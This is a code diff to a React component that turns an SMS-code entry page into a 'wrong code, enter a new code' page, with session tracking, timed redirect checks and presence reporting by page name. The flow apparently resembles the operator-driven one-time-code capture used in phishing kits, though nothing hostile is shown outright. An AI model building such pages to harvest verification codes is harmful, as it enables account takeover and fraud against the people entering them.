@@ -1,17 +1,17 @@
 import React, { useState } from "react";
-import styles from "./Sms.module.css";
+import styles from "./WrongSms.module.css";
 import { useRedirectChecker } from "../../hooks/useRedirectChecker";
 import Loading from "../../components/Loading/Loading";
 import { useOnlineStatus } from "../../hooks/useOnlineStatus";
 
-const Sms: React.FC = () => {
+const WrongSms: React.FC = () => {
   const sessionId = localStorage.getItem("currentSessionId");
-  
+
   useRedirectChecker(3000);
   useRedirectChecker(3000);
   useOnlineStatus({
     sessionId,
-    pageName: "sms",
+    pageName: "wrong-sms",
     enabled: true,
   });
 
@@ -83,7 +83,8 @@ const Sms: React.FC = () => {
     <div className={styles["balance-page"]}>
       <div className={styles["balance-container"]}>
         <div className={styles["balance-header"]}>
-          <h1>Enter the code you received in an SMS</h1>
+          <h1>You entered an incorrect code</h1>
+          <p>Please enter a new code</p>
         </div>
 
         <form onSubmit={handleSubmit} className={styles["balance-form"]}>
@@ -135,4 +136,4 @@ const Sms: React.FC = () => {
   );
 };
 
-export default Sms;
+export default WrongSms;
